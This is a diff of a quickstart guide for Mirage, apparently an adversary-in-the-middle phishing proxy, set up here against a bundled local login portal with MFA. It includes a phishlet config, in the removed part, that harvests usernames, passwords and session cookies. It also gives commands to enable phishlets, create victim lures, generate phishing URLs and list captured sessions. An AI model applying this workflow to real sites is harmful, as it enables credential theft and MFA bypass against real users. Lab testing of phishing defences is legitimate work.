@@ -1,6 +1,6 @@
-# Running Mirage Locally
+# Mirage Quickstart
 
-This guide covers running both binaries on a single machine for local testing without a real domain or ACME certificates.
+This guide covers running both binaries on a single machine for local testing without a real domain or ACME certificates. It uses the bundled target site — a simple login portal with MFA — so you can test the full AiTM pipeline end-to-end without hitting a real site.
 
 ## Overview
 
@@ -20,10 +20,22 @@ make build
 
 ---
 
-## 2. Create directories and config
+## 2. Start the target site
+
+The `examples/target-site/` directory contains a small Flask login portal ("Vault") with email/password and MFA steps — enough to test credential capture and session token capture end-to-end.
+
+```bash
+docker build -t vault-target examples/target-site/
+docker run -d --name vault-target -p 80:80 vault-target
+```
+
+---
+
+## 3. Create directories and config
 
 ```bash
 mkdir -p /tmp/mirage/{phishlets,data}
+cp examples/phishlets/target-site.yaml /tmp/mirage/phishlets/
 ```
 
 Create `/tmp/mirage/miraged.yaml`:
@@ -43,54 +55,16 @@ api:
   client_ca_cert_path: /tmp/mirage/data/api-ca.crt
 ```
 
-> Required fields: `domain`, `external_ipv4`, and `api.secret_hostname`. Everything else has defaults, but ports 443 and 53 need root — use 8443/5353 to run as a normal user. Set `self_signed: true` to skip ACME and use a locally generated CA instead.
-
----
-
-## 3. Add a phishlet
-
-Drop a phishlet YAML into `/tmp/mirage/phishlets/`. A minimal example targeting `example.com`:
-
-```yaml
-name: example
-author: you
-version: "1"
-
-proxy_hosts:
-  - phish_sub: login
-    orig_sub:  login
-    domain:    example.com
-    is_landing: true
-
-auth_tokens:
-  - domain: ".example.com"
-    keys:
-      - name: session
-        required: true
-
-credentials:
-  username:
-    key: "^username$"
-    search: "^(.+)$"
-    type: post
-  password:
-    key: "^password$"
-    search: "^(.+)$"
-    type: post
-
-login:
-  domain: login.example.com
-  path:   /login
-```
+> Required fields: `domain`, `external_ipv4`, and `api.secret_hostname`. Set `self_signed: true` to skip ACME and use a locally generated CA instead. Using non-standard ports (8443/5353) avoids needing root.
 
 ---
 
 ## 4. Add /etc/hosts entries
 
-Since there's no real DNS, point the phishing and API hostnames at localhost:
+Since there's no real DNS, point all hostnames at localhost:
 
 ```bash
-echo "127.0.0.1  login.phish.local  api.phish.local" | sudo tee -a /etc/hosts
+echo "127.0.0.1  login.phish.local  api.phish.local  login.target.local" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -143,20 +117,20 @@ This verifies the connection before saving. On success you'll see `Connected to 
 
 ```bash
 # Enable the phishlet on a hostname
-./build/mirage phishlets enable example --hostname login.phish.local
+./build/mirage phishlets enable target-site --hostname login.phish.local
 
 # Create a lure (redirect URL is where victims land after token capture)
-./build/mirage lures create example --redirect https://example.com
+./build/mirage lures create target-site --redirect http://login.target.local/dashboard
 
 # Get the phishing URL
 ./build/mirage lures url <lure-id>
 ```
 
-Visit the generated URL in a browser that trusts the CA. Sessions appear in:
+Visit the generated URL in a browser that trusts the CA. Sign in with any email and password, then enter any 6-digit code for MFA. Once MFA completes the session token is captured and the session is marked complete:
 
 ```bash
-./build/mirage sessions list
 ./build/mirage sessions list --completed
+./build/mirage sessions show <session-id>
 ```
 
 ---
@@ -167,7 +141,7 @@ Visit the generated URL in a browser that trusts the CA. Sessions appear in:
 /tmp/mirage/
 ├── miraged.yaml
 ├── phishlets/
-│   └── example.yaml
+│   └── target-site.yaml
 └── data/
     ├── data.db          # SQLite — sessions, lures, phishlet configs
     ├── ca/
@@ -184,6 +158,6 @@ Visit the generated URL in a browser that trusts the CA. Sessions appear in:
 ## Tips
 
 - Phishlet YAML files are hot-reloaded on save — no restart needed.
-- Run `./build/miraged validate --config /tmp/mirage/miraged.yaml` to check your config without starting the daemon.
+- Run `./build/miraged --config /tmp/mirage/miraged.yaml validate` to check your config without starting the daemon.
 - `./build/mirage` with no subcommand drops into an interactive REPL.
 - The CLI `--json` flag outputs raw JSON for scripting.
